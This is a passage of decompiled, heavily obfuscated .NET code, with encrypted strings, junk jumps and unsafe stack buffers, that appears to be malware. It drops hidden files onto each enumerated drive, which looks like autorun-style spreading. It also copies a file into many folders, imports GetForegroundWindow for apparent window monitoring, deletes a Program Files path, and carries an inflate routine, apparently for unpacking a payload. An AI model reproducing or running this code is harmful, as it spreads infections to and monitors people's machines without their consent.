                goto label_2;
            }
            else
              goto label_0;
          }
          else
            goto label_0;
        }
        while (false);
        goto label_5;
      }
      while (false);
      goto label_7;
label_5:
      obj0.\u0001 &= (int) short.MaxValue;
      return;
label_7:
      throw new InvalidOperationException();
    }

    static unsafe void \u0001()
    {
      // ISSUE: untyped stack allocation
      void* voidPtr1 = (void*) __untypedstackalloc(38);
      try
      {
        string str1 = \u0093.\u007E\u0098\u0002((object) \u0087\u0002.\u0091\u0003(\u000F.\u009B(3990)), \u000F.\u009B(4003), \u000F.\u009B(4016));
label_4:
        string str2 = \u007F\u0002.\u0089\u0003(\u000F.\u009B(2964), \u0081.\u0082\u0002(), \u000F.\u009B(4053));
        *(sbyte*) ((IntPtr) voidPtr1 + 36) = (sbyte) 1;
        if (*(sbyte*) ((IntPtr) voidPtr1 + 36) == (sbyte) 0)
          return;
        *(int*) ((IntPtr) voidPtr1 + 24) = 0;
label_6:
        *(long*) voidPtr1 = 0L;
        string[] strArray = \u001D\u0002.\u0084\u0003(str1);
        IntPtr num1 = (IntPtr) voidPtr1 + 24;
        *(int*) ((IntPtr) voidPtr1 + 28) = \u0088\u0002.\u007E\u0093\u0003((object) strArray, 0);
        *(int*) num1 = 0;
        while (true)
        {
          int num2 = *(int*) ((IntPtr) voidPtr1 + 24);
          *(int*) ((IntPtr) voidPtr1 + 32) = *(int*) ((IntPtr) voidPtr1 + 28);
          int num3 = *(int*) ((IntPtr) voidPtr1 + 32);
          if (num2 <= num3)
          {
            *(sbyte*) ((IntPtr) voidPtr1 + 36) = (sbyte) 1;
            if (*(sbyte*) ((IntPtr) voidPtr1 + 36) != (sbyte) 0)
            {
              *(sbyte*) ((IntPtr) voidPtr1 + 37) = (sbyte) 1;
              if (*(sbyte*) ((IntPtr) voidPtr1 + 37) != (sbyte) 0)
              {
                \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str1, \u000F.\u009B(4126)));
                \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str2, \u000F.\u009B(4151)));
                \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str1, \u000F.\u009B(3070)));
                if (true)
                {
                  \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str1, \u000F.\u009B(3070)));
                  if (true)
                  {
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str1, \u000F.\u009B(3091)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str1, \u000F.\u009B(3112)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str1, \u000F.\u009B(3137)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str1, \u000F.\u009B(3158)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str1, \u000F.\u009B(3179)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str1, \u000F.\u009B(3208)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str1, \u000F.\u009B(3229)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str1, \u000F.\u009B(3254)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str1, \u000F.\u009B(3279)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str1, \u000F.\u009B(3296)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str1, \u000F.\u009B(3321)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str1, \u000F.\u009B(3350)));
                  }
                  else
                    goto label_4;
                }
                else
                  goto label_6;
              }
              else
                goto label_13;
label_12:
              \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str1, \u000F.\u009B(3375)));
              \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str1, \u000F.\u009B(3404)));
              \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str1, \u000F.\u009B(3421)));
              \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str1, \u000F.\u009B(3446)));
              \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str1, \u000F.\u009B(3467)));
              \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str1, \u000F.\u009B(3492)));
              \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str1, \u000F.\u009B(3521)));
              \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str1, \u000F.\u009B(3546)));
              \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str1, \u000F.\u009B(3571)));
              \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str1, \u000F.\u009B(3600)));
              \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str1, \u000F.\u009B(3600)));
label_13:
              void* voidPtr2 = voidPtr1;
              *(long*) ((IntPtr) voidPtr1 + 8) = (long) \u0088\u0002.\u007E\u0093\u0003((object) strArray, 0);
              *(long*) voidPtr2 = 0L;
              while (true)
              {
                long num4 = *(long*) voidPtr1;
                *(long*) ((IntPtr) voidPtr1 + 16) = *(long*) ((IntPtr) voidPtr1 + 8);
                long num5 = *(long*) ((IntPtr) voidPtr1 + 16);
                if (num4 <= num5)
                {
                  \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str2, \u000F.\u009B(3070)));
                  \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str2, \u000F.\u009B(3070)));
                  \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str2, \u000F.\u009B(3091)));
                  \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str2, \u000F.\u009B(3112)));
                  \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str2, \u000F.\u009B(3137)));
                  if (true)
                  {
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str2, \u000F.\u009B(3158)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str2, \u000F.\u009B(3179)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str2, \u000F.\u009B(3208)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str2, \u000F.\u009B(3229)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str2, \u000F.\u009B(3254)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str2, \u000F.\u009B(3279)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str2, \u000F.\u009B(3296)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str2, \u000F.\u009B(3321)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str2, \u000F.\u009B(3350)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str2, \u000F.\u009B(3375)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str2, \u000F.\u009B(3404)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str2, \u000F.\u009B(3421)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str2, \u000F.\u009B(3446)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str2, \u000F.\u009B(3467)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str2, \u000F.\u009B(3492)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str2, \u000F.\u009B(3521)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str2, \u000F.\u009B(3546)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str2, \u000F.\u009B(3571)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str2, \u000F.\u009B(3600)));
                    \u0013\u0002.\u0019\u0003(\u0093\u0002.\u0001\u0004(*(long*) voidPtr1), \u001F.\u001A\u0002(str2, \u000F.\u009B(3600)));
                    *(long*) voidPtr1 = checked (*(long*) voidPtr1 + 1L);
                  }
                  else
                    goto label_12;
                }
                else
                  break;
              }
            }
            *(int*) ((IntPtr) voidPtr1 + 24) = checked (*(int*) unchecked ((IntPtr) voidPtr1 + 24) + 1);
          }
          else
            break;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0088.\u0089\u0002();
      }
    }

    static unsafe void \u0001()
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
label_1:
      try
      {
        \u0088.\u0089\u0002();
        *(int*) voidPtr = -2;
label_28:
        *(int*) ((IntPtr) voidPtr + 8) = 2;
        string str1 = \u001F.\u001A\u0002(\u0003.\u0006, \u000F.\u009B(4168));
        goto label_29;
label_2:
        *(int*) ((IntPtr) voidPtr + 8) = 4;
        string str2 = \u001F.\u001A\u0002(\u0003.\u0006, \u000F.\u009B(4242));
label_3:
        *(int*) ((IntPtr) voidPtr + 8) = 5;
        \u000F.\u0001(str1, \u0003.\u0002);
label_4:
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 8) = 6;
          \u000F.\u0001(str1, \u0003.\u0003);
        }
        else
          goto label_14;
label_6:
        *(int*) ((IntPtr) voidPtr + 8) = 7;
        \u000F.\u0001(str1, \u0003.\u0004);
label_7:
        *(int*) ((IntPtr) voidPtr + 8) = 8;
        \u000F.\u0001(str1, \u0003.\u0005);
label_8:
        *(int*) ((IntPtr) voidPtr + 8) = 9;
        string str3;
        \u000F.\u0001(str3, \u0003.\u0002);
label_9:
        *(int*) ((IntPtr) voidPtr + 8) = 10;
        \u000F.\u0001(str3, \u0003.\u0003);
label_10:
        *(int*) ((IntPtr) voidPtr + 8) = 11;
        \u000F.\u0001(str3, \u0003.\u0004);
label_11:
        *(int*) ((IntPtr) voidPtr + 8) = 12;
        \u000F.\u0001(str3, \u0003.\u0005);
label_12:
        *(int*) ((IntPtr) voidPtr + 8) = 13;
        if (true)
          \u000F.\u0001(str2, \u0003.\u0002);
        else
          goto label_24;
label_14:
        if (false)
          goto label_22;
label_15:
        *(int*) ((IntPtr) voidPtr + 8) = 14;
        \u000F.\u0001(str2, \u0003.\u0003);
label_16:
        *(int*) ((IntPtr) voidPtr + 8) = 15;
        \u000F.\u0001(str2, \u0003.\u0004);
label_17:
        *(int*) ((IntPtr) voidPtr + 8) = 16;
        if (true)
        {
          \u000F.\u0001(str2, \u0003.\u0005);
          goto label_33;
        }
        else
          goto label_10;
label_20:
        int num1;
        int num2 = num1 + 1;
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        switch (num2)
        {
          case 1:
            goto label_1;
          case 2:
            goto label_28;
          case 3:
            goto label_29;
          case 4:
            goto label_2;
          case 5:
            goto label_3;
          case 6:
            goto label_4;
          case 7:
            goto label_6;
          case 8:
            goto label_7;
          case 9:
            goto label_8;
          case 10:
            goto label_9;
          case 11:
            goto label_10;
          case 12:
            goto label_11;
          case 13:
            goto label_12;
          case 14:
            goto label_15;
          case 15:
            goto label_16;
          case 16:
            goto label_17;
          case 17:
            goto label_33;
          default:
            goto label_32;
        }
label_22:
        num1 = *(int*) voidPtr;
        int num3;
        if (true)
        {
          if (num1 > -2)
          {
            num3 = *(int*) voidPtr;
            goto label_26;
          }
        }
        else
          goto label_20;
label_24:
        num3 = 1;
label_26:
        switch (num3)
        {
          case 1:
            num1 = *(int*) ((IntPtr) voidPtr + 4);
            goto label_20;
          default:
            goto label_32;
        }
label_29:
        *(int*) ((IntPtr) voidPtr + 8) = 3;
        str3 = \u001F.\u001A\u0002(\u0003.\u0006, \u000F.\u009B(4201));
        goto label_2;
label_21:
        *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 8);
        goto label_22;
      }
      catch (Exception ex) when (ex is Exception & *(int*) voidPtr != 0 & *(int*) ((IntPtr) voidPtr + 4) == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_21;
      }
label_32:
      throw \u000E\u0002.\u0014\u0003(-2146828237);
label_33:
      if (*(int*) ((IntPtr) voidPtr + 4) == 0)
        return;
      \u0088.\u0089\u0002();
    }

    static unsafe void \u0001()
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(5);
      try
      {
        string str1 = \u000F.\u007E\u0080((object) \u0004\u0002.\u007E\u000F\u0003((object) \u009F.\u007E\u0005\u0003((object) \u0002.\u0002.\u0001())));
        string[] strArray = \u008C\u0002.\u0098\u0003();
        *(int*) voidPtr = 0;
label_8:
        *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) (*(int*) voidPtr < strArray.Length);
label_9:
        while (*(sbyte*) ((IntPtr) voidPtr + 4) != (sbyte) 0)
        {
          do
          {
            string str2 = strArray[*(int*) voidPtr];
            *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) !\u008E.\u0092\u0002(\u001F.\u001A\u0002(str2, \u000F.\u009B(4287)));
            if (*(sbyte*) ((IntPtr) voidPtr + 4) != (sbyte) 0)
              \u0013\u0002.\u0019\u0003(\u000F.\u007E\u0081((object) \u0094\u0002.\u0002\u0004()), \u001F.\u001A\u0002(str2, \u000F.\u009B(4287)));
            StreamWriter streamWriter = new StreamWriter(\u001F.\u001A\u0002(str2, \u000F.\u009B(4300)));
            \u0013.\u007E\u0005\u0002((object) streamWriter, \u000F.\u009B(4317));
            if (true)
            {
              \u0013.\u007E\u0005\u0002((object) streamWriter, \u000F.\u009B(4330));
              \u0013.\u007E\u0005\u0002((object) streamWriter, \u000F.\u009B(4355));
              \u0010.\u007E\u008D((object) streamWriter);
              \u0084\u0002.\u008E\u0003(\u001F.\u001A\u0002(str2, \u000F.\u009B(4300)), FileAttributes.Hidden);
              \u0084\u0002.\u008E\u0003(\u001F.\u001A\u0002(str2, \u000F.\u009B(4287)), FileAttributes.Hidden);
            }
            else
              goto label_9;
          }
          while (false);
          *(int*) voidPtr = checked (*(int*) voidPtr + 1);
          goto label_8;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0088.\u0089\u0002();
      }
    }

    static unsafe void \u0001()
    {
      // ISSUE: untyped stack allocation
      IntPtr num1 = __untypedstackalloc(12);
      if (true)
        goto label_24;
label_1:
label_2:
      void* voidPtr;
      try
      {
        \u0088.\u0089\u0002();
        *(int*) voidPtr = -2;
label_3:
        string str;
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 8) = 2;
          if (true)
          {
            str = \u001F.\u001A\u0002(\u0003.\u0006, \u000F.\u009B(4388));
            goto label_17;
          }
          else
            goto label_7;
        }
        else
          goto label_8;
label_5:
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 8) = 4;
          \u000F.\u0001(str, \u0003.\u0003);
        }
        else
          goto label_9;
label_7:
        *(int*) ((IntPtr) voidPtr + 8) = 5;
        \u000F.\u0001(str, \u0003.\u0004);
label_8:
        *(int*) ((IntPtr) voidPtr + 8) = 6;
        \u000F.\u0001(str, \u0003.\u0005);
        goto label_21;
label_9:
        int num2 = *(int*) ((IntPtr) voidPtr + 4);
        int num3 = 1;
        int num4;
        if (num3 != 0)
          num4 = num2 + num3;
        else
          goto label_14;
label_11:
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        switch (num4)
        {
          case 1:
            goto label_2;
          case 2:
            goto label_3;
          case 3:
            goto label_17;
          case 4:
            goto label_5;
          case 5:
            goto label_7;
          case 6:
            goto label_8;
          case 7:
            goto label_21;
          default:
            goto label_20;
        }
label_14:
        switch (num2 > num3 ? *(int*) voidPtr : 1)
        {
          case 1:
            goto label_9;
          default:
            goto label_20;
        }
label_17:
        *(int*) ((IntPtr) voidPtr + 8) = 3;
        \u000F.\u0001(str, \u0003.\u0002);
        goto label_5;
label_12:
        *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 8);
        num4 = *(int*) voidPtr;
        if (true)
        {
          num3 = -2;
          num2 = num4;
          goto label_14;
        }
        else
          goto label_11;
      }
      catch (Exception ex) when (ex is Exception & *(int*) voidPtr != 0 & *(int*) ((IntPtr) voidPtr + 4) == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_12;
      }
label_20:
      throw \u000E\u0002.\u0014\u0003(-2146828237);
label_21:
      do
        ;
      while (false);
      if (*(int*) ((IntPtr) voidPtr + 4) == 0)
        return;
      \u0088.\u0089\u0002();
      return;
label_24:
      voidPtr = (void*) num1;
      goto label_1;
    }

    [DllImport("user32.dll", EntryPoint = "GetForegroundWindow", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern int \u0001();

    static unsafe void \u0001()
    {
      // ISSUE: untyped stack allocation
      IntPtr num1 = __untypedstackalloc(12);
      if (true)
        goto label_24;
label_1:
label_2:
      void* voidPtr;
      try
      {
        \u0088.\u0089\u0002();
        *(int*) voidPtr = -2;
label_3:
        string str;
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 8) = 2;
          if (true)
          {
            str = \u001F.\u001A\u0002(\u0003.\u0006, \u000F.\u009B(4413));
            goto label_17;
          }
          else
            goto label_7;
        }
        else
          goto label_8;
label_5:
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 8) = 4;
          \u000F.\u0001(str, \u0003.\u0003);
        }
        else
          goto label_9;
label_7:
        *(int*) ((IntPtr) voidPtr + 8) = 5;
        \u000F.\u0001(str, \u0003.\u0004);
label_8:
        *(int*) ((IntPtr) voidPtr + 8) = 6;
        \u000F.\u0001(str, \u0003.\u0005);
        goto label_21;
label_9:
        int num2 = *(int*) ((IntPtr) voidPtr + 4);
        int num3 = 1;
        int num4;
        if (num3 != 0)
          num4 = num2 + num3;
        else
          goto label_14;
label_11:
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        switch (num4)
        {
          case 1:
            goto label_2;
          case 2:
            goto label_3;
          case 3:
            goto label_17;
          case 4:
            goto label_5;
          case 5:
            goto label_7;
          case 6:
            goto label_8;
          case 7:
            goto label_21;
          default:
            goto label_20;
        }
label_14:
        switch (num2 > num3 ? *(int*) voidPtr : 1)
        {
          case 1:
            goto label_9;
          default:
            goto label_20;
        }
label_17:
        *(int*) ((IntPtr) voidPtr + 8) = 3;
        \u000F.\u0001(str, \u0003.\u0002);
        goto label_5;
label_12:
        *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 8);
        num4 = *(int*) voidPtr;
        if (true)
        {
          num3 = -2;
          num2 = num4;
          goto label_14;
        }
        else
          goto label_11;
      }
      catch (Exception ex) when (ex is Exception & *(int*) voidPtr != 0 & *(int*) ((IntPtr) voidPtr + 4) == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_12;
      }
label_20:
      throw \u000E\u0002.\u0014\u0003(-2146828237);
label_21:
      do
        ;
      while (false);
      if (*(int*) ((IntPtr) voidPtr + 4) == 0)
        return;
      \u0088.\u0089\u0002();
      return;
label_24:
      voidPtr = (void*) num1;
      goto label_1;
    }

    static unsafe void \u0001()
    {
      // ISSUE: untyped stack allocation
      IntPtr num1 = __untypedstackalloc(12);
      if (true)
        goto label_24;
label_1:
label_2:
      void* voidPtr;
      try
      {
        \u0088.\u0089\u0002();
        *(int*) voidPtr = -2;
label_3:
        string str;
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 8) = 2;
          if (true)
          {
            str = \u001F.\u001A\u0002(\u0003.\u0006, \u000F.\u009B(4434));
            goto label_17;
          }
          else
            goto label_7;
        }
        else
          goto label_8;
label_5:
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 8) = 4;
          \u000F.\u0001(str, \u0003.\u0003);
        }
        else
          goto label_9;
label_7:
        *(int*) ((IntPtr) voidPtr + 8) = 5;
        \u000F.\u0001(str, \u0003.\u0004);
label_8:
        *(int*) ((IntPtr) voidPtr + 8) = 6;
        \u000F.\u0001(str, \u0003.\u0005);
        goto label_21;
label_9:
        int num2 = *(int*) ((IntPtr) voidPtr + 4);
        int num3 = 1;
        int num4;
        if (num3 != 0)
          num4 = num2 + num3;
        else
          goto label_14;
label_11:
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        switch (num4)
        {
          case 1:
            goto label_2;
          case 2:
            goto label_3;
          case 3:
            goto label_17;
          case 4:
            goto label_5;
          case 5:
            goto label_7;
          case 6:
            goto label_8;
          case 7:
            goto label_21;
          default:
            goto label_20;
        }
label_14:
        switch (num2 > num3 ? *(int*) voidPtr : 1)
        {
          case 1:
            goto label_9;
          default:
            goto label_20;
        }
label_17:
        *(int*) ((IntPtr) voidPtr + 8) = 3;
        \u000F.\u0001(str, \u0003.\u0002);
        goto label_5;
label_12:
        *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 8);
        num4 = *(int*) voidPtr;
        if (true)
        {
          num3 = -2;
          num2 = num4;
          goto label_14;
        }
        else
          goto label_11;
      }
      catch (Exception ex) when (ex is Exception & *(int*) voidPtr != 0 & *(int*) ((IntPtr) voidPtr + 4) == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_12;
      }
label_20:
      throw \u000E\u0002.\u0014\u0003(-2146828237);
label_21:
      do
        ;
      while (false);
      if (*(int*) ((IntPtr) voidPtr + 4) == 0)
        return;
      \u0088.\u0089\u0002();
      return;
label_24:
      voidPtr = (void*) num1;
      goto label_1;
    }

    static unsafe int \u0001([In] int obj0, [In] byte[] obj1, [In] int obj2, [In] \u0005.\u0003 obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      int num1;
      int num2;
      do
      {
        *(int*) voidPtr = obj3.\u0001;
        num1 = obj2;
        num2 = obj3.\u0002;
        if (true)
        {
          if (true)
          {
            if (num1 <= num2)
              goto label_17;
            else
              goto label_16;
label_4:
            *(int*) ((IntPtr) voidPtr + 4) = obj2;
            continue;
label_16:
            obj2 = obj3.\u0002;
            goto label_4;
label_17:
            *(int*) voidPtr = obj3.\u0001 - obj3.\u0002 + obj2 & (int) short.MaxValue;
            goto label_4;
          }
          else
            goto label_10;
        }
        else
          goto label_12;
      }
      while (false);
      if (true)
      {
        *(int*) ((IntPtr) voidPtr + 8) = obj2 - *(int*) voidPtr;
        int num3 = *(int*) ((IntPtr) voidPtr + 8);
        int num4 = 0;
        if (num4 == 0)
        {
          if (num3 > num4)
            Array.Copy((Array) obj3.\u0001, 32768 - *(int*) ((IntPtr) voidPtr + 8), (Array) obj1, obj0, *(int*) ((IntPtr) voidPtr + 8));
          else
            goto label_11;
        }
        else
        {
          num2 = num4;
          num1 = num3;
          goto label_10;
        }
      }
      int num5 = obj0;
      num2 = *(int*) ((IntPtr) voidPtr + 8);
      num1 = num5;
label_10:
      obj0 = num1 + num2;
      obj2 = *(int*) voidPtr;
label_11:
      Array.Copy((Array) obj3.\u0001, *(int*) voidPtr - obj2, (Array) obj1, obj0, obj2);
      obj3.\u0002 -= *(int*) ((IntPtr) voidPtr + 4);
      int num6 = obj3.\u0002;
      num2 = 0;
      num1 = num6;
label_12:
      if (num1 < num2)
        throw new InvalidOperationException();
      return *(int*) ((IntPtr) voidPtr + 4);
    }

    static bool \u0001([In] \u0005.\u0002 obj0) => obj0.\u0001 == obj0.\u0002;

    static unsafe bool \u0001([In] \u0005.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      int num1 = \u000F.\u0001(obj0.\u0001);
      while (true)
      {
        int index1;
        while (num1 >= 258)
        {
          *(int*) ((IntPtr) voidPtr + 8) = obj0.\u0001;
          switch (*(int*) ((IntPtr) voidPtr + 8))
          {
            case 7:
              int num2 = \u000F.\u0001(obj0.\u0001, obj0.\u0001);
              if (true)
              {
                index1 = num2;
                int num3;
                for (int index2 = num2 & -256; index2 == 0; index2 = num3)
                {
                  \u000F.\u0001(obj0.\u0001, index1);
                  num3 = num1;
                  if (true)
                  {
                    if ((num1 = num3 - 1) < 258)
                      return true;
                    goto case 7;
                  }
                }
                int num4 = index1;
                num2 = 257;
                num2 = num4;
              }
              if (num2 < num2)
              {
                if (index1 < 0)
                  return false;
                obj0.\u0002 = (\u0005.\u0004) null;
                obj0.\u0001 = (\u0005.\u0004) null;
                obj0.\u0001 = 2;
                return true;
              }
              obj0.\u0003 = \u0005.\u0001.\u0001[index1 - 257];
              obj0.\u0002 = \u0005.\u0001.\u0002[index1 - 257];
              goto case 8;
            case 8:
              if (obj0.\u0002 > 0)
              {
                obj0.\u0001 = 8;
                if (true)
                {
                  *(int*) voidPtr = \u000F.\u0001(obj0.\u0001, obj0.\u0002);
                  if (*(int*) voidPtr < 0)
                    return false;
                  \u000F.\u0001(obj0.\u0001, obj0.\u0002);
                  obj0.\u0003 += *(int*) voidPtr;
                }
                else
                  goto label_21;
              }
              obj0.\u0001 = 9;
              goto case 9;
            case 9:
              index1 = \u000F.\u0001(obj0.\u0002, obj0.\u0001);
              goto label_20;
            case 10:
              goto label_23;
            default:
              continue;
          }
        }
        goto label_29;
label_20:
        if (index1 >= 0)
        {
          obj0.\u0004 = \u0005.\u0001.\u0003[index1];
          obj0.\u0002 = \u0005.\u0001.\u0004[index1];
        }
        else
          break;
label_23:
        if (obj0.\u0002 > 0)
        {
          obj0.\u0001 = 10;
          *(int*) ((IntPtr) voidPtr + 4) = \u000F.\u0001(obj0.\u0001, obj0.\u0002);
          if (*(int*) ((IntPtr) voidPtr + 4) >= 0)
          {
            \u000F.\u0001(obj0.\u0001, obj0.\u0002);
            obj0.\u0004 += *(int*) ((IntPtr) voidPtr + 4);
          }
          else
            goto label_25;
        }
        \u000F.\u0001(obj0.\u0001, obj0.\u0003, obj0.\u0004);
        num1 -= obj0.\u0003;
        obj0.\u0001 = 7;
        continue;
label_29:
        if (false)
          goto label_20;
        else
          goto label_30;
      }
label_21:
      return false;
label_25:
      return false;
label_30:
      return true;
    }

    static void \u0001()
    {
      string str = \u001F.\u001A\u0002(\u009D.\u0003\u0003(Environment.SpecialFolder.ProgramFiles), \u000F.\u009B(4467));
      if (true)
      {
        int num = \u008E.\u0092\u0002(str) ? 1 : 0;
        do
        {
          if (true)
            goto label_7;
label_4:
          continue;
label_7:
          num = num != 0 ? 1 : 0;
          goto label_4;
        }
        while (false);
        if (num == 0)
          return;
      }
      \u001E\u0002.\u0087\u0003(str);
    }

    static void \u0001([In] \u0005.\u0002 obj0)
    {
      obj0.\u0001 >>= obj0.\u0003 & 7;
      obj0.\u0003 &= -8;
    }

    static int \u0001([In] \u0005.\u0007 obj0) => obj0.ReadByte() | obj0.ReadByte() << 8;

    static unsafe bool \u0001([In] \u0005.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      switch (obj0.\u0001)
      {
        case 2:
          if (obj0.\u0001)
          {
            obj0.\u0001 = 12;
            return false;
          }
          *(int*) voidPtr = \u000F.\u0001(obj0.\u0001, 3);
          if (*(int*) voidPtr < 0)
            return false;
